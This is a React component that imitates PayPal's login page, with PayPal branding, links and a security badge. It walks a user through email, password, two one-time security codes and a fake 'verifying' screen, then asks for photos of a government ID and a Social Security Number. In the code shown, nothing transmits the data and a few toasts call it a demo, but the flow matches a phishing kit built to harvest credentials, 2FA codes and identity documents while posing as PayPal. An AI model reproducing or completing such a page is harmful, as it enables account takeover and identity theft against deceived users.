import { useState } from "react";
import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2" | "verify-documents";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [verificationCode2, setVerificationCode2] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [idCardFront, setIdCardFront] = useState<File | null>(null);
  const [idCardBack, setIdCardBack] = useState<File | null>(null);
  const [ssn, setSsn] = useState("");
  const [step, setStep] = useState<LoginStep>("email");
  const [isLoading, setIsLoading] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<"sms" | "email">("sms");
  const [codeSent, setCodeSent] = useState(false);
  const { toast } = useToast();

  const maskedPhone = "••••••7890";
  const maskedEmail = email ? `${email.substring(0, 3)}•••@${email.split("@")[1] || "demo.com"}` : "tes•••@demo.com";

  const handleEmailNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      setStep("password");
    }
  };

  const handlePasswordNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) return;

    setIsLoading(true);
    // Simulate authentication process
    setTimeout(() => {
      setIsLoading(false);
      setStep("verify-code");
      toast({
        description: `We sent a security code to ${maskedPhone}`,
      });
    }, 1200);
  };

  const handleSendCode = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setCodeSent(true);
      setStep("verify-code");
      toast({
        description: `We sent a code to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
      });
    }, 1000);
  };

  const handleVerifyCode = (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode.length < 6) return;

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep("verifying");

      // After 3 seconds of verifying animation, show second code prompt
      setTimeout(() => {
        setStep("verify-code-2");
        toast({
          description: `For your security, we sent another code to ${maskedPhone}`,
        });
      }, 3000);
    }, 1000);
  };

  const handleVerifyCode2 = (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode2.length < 6) return;

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep("verify-documents");
    }, 1000);
  };

  const handleBackToEmail = () => {
    setStep("email");
    setPassword("");
    setVerificationCode("");
    setVerificationCode2("");
    setCodeSent(false);
  };

  const handleBackToPassword = () => {
    setStep("password");
    setVerificationCode("");
    setVerificationCode2("");
    setCodeSent(false);
  };

  const handleBackToVerifyMethod = () => {
    setStep("verify-method");
    setVerificationCode("");
  };

  const handleBackToFirstCode = () => {
    setStep("verify-code");
    setVerificationCode2("");
  };

  const handleDocumentVerification = (e: React.FormEvent) => {
    e.preventDefault();
    if (!idCardFront || !idCardBack || ssn.length < 9) return;

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      toast({
        description: "Thank you. Your identity has been verified.",
      });
      // Reset all states
      setStep("email");
      setEmail("");
      setPassword("");
      setVerificationCode("");
      setVerificationCode2("");
      setIdCardFront(null);
      setIdCardBack(null);
      setSsn("");
      setCodeSent(false);
    }, 2000);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
    const file = e.target.files?.[0];
    if (file) {
      if (side === "front") {
        setIdCardFront(file);
      } else {
        setIdCardBack(file);
      }
    }
  };

  const formatSSN = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 9);
    if (numbers.length <= 3) return numbers;
    if (numbers.length <= 5) return `${numbers.slice(0, 3)}-${numbers.slice(3)}`;
    return `${numbers.slice(0, 3)}-${numbers.slice(3, 5)}-${numbers.slice(5)}`;
  };

  const renderVerifyDocumentsStep = () => (
    <form onSubmit={handleDocumentVerification} data-testid="form-verify-documents">
      <div className="flex flex-col items-center mb-8">
        <div className="w-20 h-20 rounded-full bg-[#0070e0]/10 dark:bg-[#0070e0]/20 flex items-center justify-center mb-5">
          <User className="w-10 h-10 text-[#0070e0]" />
        </div>
        <h1 className="text-[24px] sm:text-[28px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
          Confirm your identity
        </h1>
        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[360px]">
          To help protect your account, we need to verify your identity with a government-issued ID and Social Security Number
        </p>
      </div>

      <div className="space-y-6">
        {/* ID Card Front */}
        <div>
          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
            ID Card (Front)
          </label>
          <div className="relative">
            <input
              type="file"
              accept="image/*"
              onChange={(e) => handleFileUpload(e, "front")}
              className="hidden"
              id="id-front"
              data-testid="input-id-front"
            />
            <label
              htmlFor="id-front"
              className="flex flex-col items-center justify-center w-full h-[140px] border-2 border-dashed border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#0070e0] hover:bg-[#f5f9fc] dark:hover:bg-[#0a1a2a] transition-all bg-white dark:bg-[#1a1a1a]"
            >
              {idCardFront ? (
                <div className="text-center px-4">
                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#0070e0]/10 flex items-center justify-center">
                    <svg className="w-6 h-6 text-[#0070e0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <p className="text-[14px] text-[#1a1a1a] dark:text-white font-medium truncate">{idCardFront.name}</p>
                  <p className="text-[13px] text-[#0070e0] mt-2">Tap to change</p>
                </div>
              ) : (
                <div className="text-center px-4">
                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center">
                    <svg className="w-6 h-6 text-[#6c7378]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                    </svg>
                  </div>
                  <p className="text-[15px] text-[#1a1a1a] dark:text-white font-medium">Upload front of ID</p>
                  <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG or PNG (max 5MB)</p>
                </div>
              )}
            </label>
          </div>
        </div>

        {/* ID Card Back */}
        <div>
          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
            ID Card (Back)
          </label>
          <div className="relative">
            <input
              type="file"
              accept="image/*"
              onChange={(e) => handleFileUpload(e, "back")}
              className="hidden"
              id="id-back"
              data-testid="input-id-back"
            />
            <label
              htmlFor="id-back"
              className="flex flex-col items-center justify-center w-full h-[140px] border-2 border-dashed border-[#cbd2d6] dark:border-[#3d3d3d] rounded-lg cursor-pointer hover:border-[#0070e0] hover:bg-[#f5f9fc] dark:hover:bg-[#0a1a2a] transition-all bg-white dark:bg-[#1a1a1a]"
            >
              {idCardBack ? (
                <div className="text-center px-4">
                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#0070e0]/10 flex items-center justify-center">
                    <svg className="w-6 h-6 text-[#0070e0]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <p className="text-[14px] text-[#1a1a1a] dark:text-white font-medium truncate">{idCardBack.name}</p>
                  <p className="text-[13px] text-[#0070e0] mt-2">Tap to change</p>
                </div>
              ) : (
                <div className="text-center px-4">
                  <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center">
                    <svg className="w-6 h-6 text-[#6c7378]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                    </svg>
                  </div>
                  <p className="text-[15px] text-[#1a1a1a] dark:text-white font-medium">Upload back of ID</p>
                  <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-1">JPG or PNG (max 5MB)</p>
                </div>
              )}
            </label>
          </div>
        </div>

        {/* SSN Input */}
        <div>
          <label className="block text-[14px] font-medium text-[#1a1a1a] dark:text-white mb-3">
            Social Security Number
          </label>
          <input
            type="text"
            inputMode="numeric"
            placeholder="XXX-XX-XXXX"
            value={ssn}
            onChange={(e) => setSsn(formatSSN(e.target.value))}
            className="paypal-input"
            data-testid="input-ssn"
            maxLength={11}
          />
          <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-3">
            Your information is secure and will only be used to verify your identity
          </p>
        </div>

        <button
          type="submit"
          className="paypal-btn-primary flex items-center justify-center gap-2 mt-8"
          disabled={!idCardFront || !idCardBack || ssn.replace(/\D/g, "").length < 9 || isLoading}
          data-testid="button-verify-documents"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Continue"
          )}
        </button>

        <div className="pt-6 mt-6 border-t border-[#e8e8e8] dark:border-[#2a2a2a]">
          <div className="flex items-center justify-center gap-2 text-[#6c7378] dark:text-[#8f8f8f]">
            <Lock className="w-4 h-4" />
            <p className="text-[13px]">
              Your information is encrypted and secure
            </p>
          </div>
        </div>
      </div>
    </form>
  );

  const renderVerifyCode2Step = () => (
    <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
      <div className="flex flex-col items-center mb-8">
        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-5">
          <Lock className="w-8 h-8 text-[#0070e0]" />
        </div>
        <h2 className="text-[24px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
          Additional security required
        </h2>
        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
          We sent another code to {maskedPhone} to verify your identity
        </p>
      </div>

      <div className="space-y-6">
        <div>
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="••••••"
            value={verificationCode2}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
              setVerificationCode2(value);
            }}
            className="w-full h-[60px] px-4 text-center text-[32px] tracking-[0.3em] font-semibold border-2 border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md bg-white dark:bg-[#1a1a1a] text-[#1a1a1a] dark:text-white placeholder-[#d0d0d0] dark:placeholder-[#5a5a5a] transition-all duration-150 focus:outline-none focus:border-[#0070e0] focus:ring-0"
            data-testid="input-code-2"
            autoFocus
            maxLength={6}
          />
        </div>

        <button
          type="submit"
          className="paypal-btn-primary flex items-center justify-center gap-2"
          disabled={verificationCode2.length < 6 || isLoading}
          data-testid="button-verify-2"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Continue"
          )}
        </button>

        <div className="text-center pt-2">
          <button
            type="button"
            className="paypal-btn-text"
            data-testid="button-resend-2"
            onClick={() => {
              toast({
                description: `We've sent a new code to ${maskedPhone}`,
              });
            }}
          >
            Didn't receive a code?
          </button>
        </div>
      </div>
    </form>
  );

  const footerLinks = [
    "Help",
    "Contact",
    "Fees", 
    "Security",
    "Apps",
    "Shop",
    "Enterprise",
    "Partners"
  ];

  const renderEmailStep = () => (
    <form onSubmit={handleEmailNext} data-testid="form-email">
      <h1 
        className="text-[24px] sm:text-[28px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-8 tracking-tight"
        data-testid="text-title"
      >
        Log in to PayPal
      </h1>

      <div className="space-y-5">
        <div>
          <input
            type="text"
            placeholder="Email or mobile number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="paypal-input"
            data-testid="input-email"
            autoComplete="email"
            autoFocus
          />
        </div>

        <button
          type="submit"
          className="paypal-btn-primary"
          disabled={!email.trim()}
          data-testid="button-next"
        >
          Next
        </button>

        <div className="paypal-divider">
          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] font-medium">or</span>
        </div>

        <button
          type="button"
          className="paypal-btn-secondary"
          data-testid="button-signup"
          onClick={() => {
            toast({
              description: "Sign up is not available in this demo version.",
            });
          }}
        >
          Sign Up
        </button>
      </div>
    </form>
  );

  const renderPasswordStep = () => (
    <form onSubmit={handlePasswordNext} data-testid="form-password">
      <div className="flex flex-col items-center mb-8">
        <div 
          className="w-[72px] h-[72px] rounded-full bg-gradient-to-br from-[#0070e0] to-[#003087] flex items-center justify-center text-[28px] font-semibold text-white mb-4 shadow-lg"
          data-testid="avatar-user"
        >
          {email.charAt(0).toUpperCase()}
        </div>
        <button
          type="button"
          onClick={handleBackToEmail}
          className="paypal-link text-[15px] flex items-center gap-1"
          data-testid="button-change-email"
        >
          {email}
          <ChevronDown className="w-4 h-4" />
        </button>
      </div>

      <div className="space-y-5">
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="paypal-input pr-14"
            data-testid="input-password"
            autoComplete="current-password"
            autoFocus
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white transition-colors"
            data-testid="button-toggle-password"
            aria-label={showPassword ? "Hide password" : "Show password"}
          >
            {showPassword ? (
              <EyeOff className="w-5 h-5" />
            ) : (
              <Eye className="w-5 h-5" />
            )}
          </button>
        </div>

        <div className="flex justify-between items-center">
          <label className="flex items-center gap-2 cursor-pointer group">
            <input 
              type="checkbox" 
              className="w-4 h-4 rounded border-2 border-[#c4c4c4] text-[#0070e0] focus:ring-[#0070e0] focus:ring-offset-0"
            />
            <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] group-hover:text-[#1a1a1a] dark:group-hover:text-white transition-colors">
              Stay logged in
            </span>
          </label>
          <a
            href="https://www.paypal.com/us/smarthelp/contact-us?email=recover"
            target="_blank"
            rel="noopener noreferrer"
            className="paypal-btn-text"
            data-testid="link-forgot-password"
          >
            Forgot password?
          </a>
        </div>

        <button
          type="submit"
          className="paypal-btn-primary flex items-center justify-center gap-2"
          disabled={!password.trim() || isLoading}
          data-testid="button-login"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Log In"
          )}
        </button>

        <div className="paypal-divider">
          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] font-medium">or</span>
        </div>

        <button
          type="button"
          className="paypal-btn-secondary flex items-center justify-center gap-2"
          data-testid="button-one-touch"
          onClick={() => {
            toast({
              description: "One Touch login is not available in this demo version.",
            });
          }}
        >
          <User className="w-5 h-5" />
          Log in with a one-time code
        </button>
      </div>
    </form>
  );

  const renderVerifyMethodStep = () => (
    <div data-testid="form-verify-method">
      <button
        type="button"
        onClick={handleBackToPassword}
        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
        data-testid="button-back-password"
      >
        <ChevronLeft className="w-5 h-5" />
        <span className="text-[14px]">Back</span>
      </button>

      <div className="flex flex-col items-center mb-6">
        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
          <Lock className="w-8 h-8 text-[#0070e0]" />
        </div>
        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
          Verify it's you
        </h2>
        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
          We'll send you a code to confirm your identity
        </p>
      </div>

      <div className="space-y-3 mb-6">
        <button
          type="button"
          onClick={() => setSelectedMethod("sms")}
          className={`w-full p-4 rounded-lg border-2 flex items-center gap-4 transition-all ${
            selectedMethod === "sms" 
              ? "border-[#0070e0] bg-[#f5f9fc] dark:bg-[#0a1a2a]" 
              : "border-[#e0e0e0] dark:border-[#3d3d3d] hover:border-[#a0a0a0] dark:hover:border-[#5a5a5a]"
          }`}
          data-testid="option-sms"
        >
          <div className="w-10 h-10 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
            <Smartphone className="w-5 h-5 text-[#0070e0]" />
          </div>
          <div className="text-left">
            <p className="text-[15px] font-medium text-[#1a1a1a] dark:text-white">Text message</p>
            <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]">{maskedPhone}</p>
          </div>
          {selectedMethod === "sms" && (
            <div className="ml-auto w-5 h-5 rounded-full bg-[#0070e0] flex items-center justify-center">
              <div className="w-2 h-2 rounded-full bg-white" />
            </div>
          )}
        </button>

        <button
          type="button"
          onClick={() => setSelectedMethod("email")}
          className={`w-full p-4 rounded-lg border-2 flex items-center gap-4 transition-all ${
            selectedMethod === "email" 
              ? "border-[#0070e0] bg-[#f5f9fc] dark:bg-[#0a1a2a]" 
              : "border-[#e0e0e0] dark:border-[#3d3d3d] hover:border-[#a0a0a0] dark:hover:border-[#5a5a5a]"
          }`}
          data-testid="option-email"
        >
          <div className="w-10 h-10 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
            <Mail className="w-5 h-5 text-[#0070e0]" />
          </div>
          <div className="text-left">
            <p className="text-[15px] font-medium text-[#1a1a1a] dark:text-white">Email</p>
            <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]">{maskedEmail}</p>
          </div>
          {selectedMethod === "email" && (
            <div className="ml-auto w-5 h-5 rounded-full bg-[#0070e0] flex items-center justify-center">
              <div className="w-2 h-2 rounded-full bg-white" />
            </div>
          )}
        </button>
      </div>

      <button
        type="button"
        onClick={handleSendCode}
        className="paypal-btn-primary flex items-center justify-center gap-2"
        disabled={isLoading}
        data-testid="button-send-code"
      >
        {isLoading ? (
          <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
        ) : (
          "Send Code"
        )}
      </button>

      <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-4">
        Standard messaging rates may apply
      </p>
    </div>
  );

  const renderVerifyingStep = () => (
    <div data-testid="form-verifying" className="flex flex-col items-center justify-center py-16">
      <div className="mb-10 relative">
        <div className="w-20 h-20 animate-pulse flex items-center justify-center">
          <img src="/favicon.png" alt="PayPal" className="w-full h-full object-contain" />
        </div>
        <div className="absolute -inset-3 rounded-full border-[3px] border-[#0070e0] border-t-transparent animate-spin" />
      </div>
      <h2 className="text-[20px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
        Verifying your security code
      </h2>
      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[320px]">
        This may take a moment
      </p>
    </div>
  );

  const renderVerifyCodeStep = () => (
    <form onSubmit={handleVerifyCode} data-testid="form-verify-code">
      <div className="flex flex-col items-center mb-8">
        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-5">
          <Smartphone className="w-8 h-8 text-[#0070e0]" />
        </div>
        <h2 className="text-[24px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
          Enter security code
        </h2>
        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
          We sent a 6-digit code to {maskedPhone}
        </p>
      </div>

      <div className="space-y-6">
        <div>
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="••••••"
            value={verificationCode}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
              setVerificationCode(value);
            }}
            className="w-full h-[60px] px-4 text-center text-[32px] tracking-[0.3em] font-semibold border-2 border-[#c4c4c4] dark:border-[#3d3d3d] rounded-md bg-white dark:bg-[#1a1a1a] text-[#1a1a1a] dark:text-white placeholder-[#d0d0d0] dark:placeholder-[#5a5a5a] transition-all duration-150 focus:outline-none focus:border-[#0070e0] focus:ring-0"
            data-testid="input-code"
            autoFocus
            maxLength={6}
          />
        </div>

        <button
          type="submit"
          className="paypal-btn-primary flex items-center justify-center gap-2"
          disabled={verificationCode.length < 6 || isLoading}
          data-testid="button-verify"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Continue"
          )}
        </button>

        <div className="text-center pt-2">
          <button
            type="button"
            className="paypal-btn-text"
            data-testid="button-resend"
            onClick={() => {
              toast({
                description: `We've sent a new code to ${maskedPhone}`,
              });
            }}
          >
            Didn't receive a code?
          </button>
        </div>
      </div>
    </form>
  );

  return (
    <div className="min-h-screen bg-white dark:bg-[#0a0a0a] flex flex-col">
      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center pt-10 sm:pt-16 pb-8 px-4">
        {/* Logo */}
        <div className="mb-10">
          <img src="/favicon.png" alt="PayPal" className="h-[28px] sm:h-[32px] w-auto" />
        </div>

        {/* Login Card */}
        <div className="paypal-card w-full max-w-[440px]">
          {/* PayPal Security Badge */}
          <div className="flex items-center justify-center mb-6 pb-5 border-b border-[#e8e8e8] dark:border-[#2a2a2a]">
            <img 
              src="https://www.paypalobjects.com/webstatic/mktg/logo/bdg_secured_by_pp_2line.png" 
              alt="Secured by PayPal" 
              className="h-[40px] w-auto"
              data-testid="img-paypal-security-badge"
            />
          </div>
          
          {step === "email" && renderEmailStep()}
          {step === "password" && renderPasswordStep()}
          {step === "verify-method" && renderVerifyMethodStep()}
          {step === "verify-code" && renderVerifyCodeStep()}
          {step === "verifying" && renderVerifyingStep()}
          {step === "verify-code-2" && renderVerifyCode2Step()}
          {step === "verify-documents" && renderVerifyDocumentsStep()}
        </div>

        {/* Security Badge */}
        <div className="flex items-center justify-center gap-2 mt-8">
          <Lock className="w-4 h-4 text-[#6c7378] dark:text-[#8f8f8f]" />
          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]" data-testid="text-security">
            Secure connection
          </span>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-6 px-4 border-t border-[#e8e8e8] dark:border-[#2a2a2a]">
        <div className="max-w-[800px] mx-auto">
          {/* Language Selector */}
          <div className="flex items-center justify-center gap-1 mb-5">
            <button 
              className="flex items-center gap-1 paypal-btn-text text-[13px]"
              data-testid="button-language"
              onClick={() => {
                toast({
                  description: "Language selection is not available in this demo version.",
                });
              }}
            >
              English
              <ChevronDown className="w-4 h-4" />
            </button>
          </div>

          {/* Footer Links */}
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-5">
            <a href="https://www.paypal.com/us/smarthelp/home" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-help">Help</a>
            <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-contact">Contact</a>
            <a href="https://www.paypal.com/us/webapps/mpp/paypal-fees" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-fees">Fees</a>
            <a href="https://www.paypal.com/us/webapps/mpp/paypal-safety-and-security" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-security">Security</a>
            <a href="https://www.paypal.com/us/digital-wallet/ways-to-pay/mobile-wallet" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-apps">Apps</a>
            <a href="https://www.paypal.com/us/shop" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-shop">Shop</a>
            <a href="https://www.paypal.com/us/business" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-enterprise">Enterprise</a>
            <a href="https://www.paypal.com/us/webapps/mpp/partner-program" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-partners">Partners</a>
          </div>

          {/* Copyright */}
          <p 
            className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center"
            data-testid="text-copyright"
          >
            &copy; 1999-{new Date().getFullYear()} PayPal, Inc. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}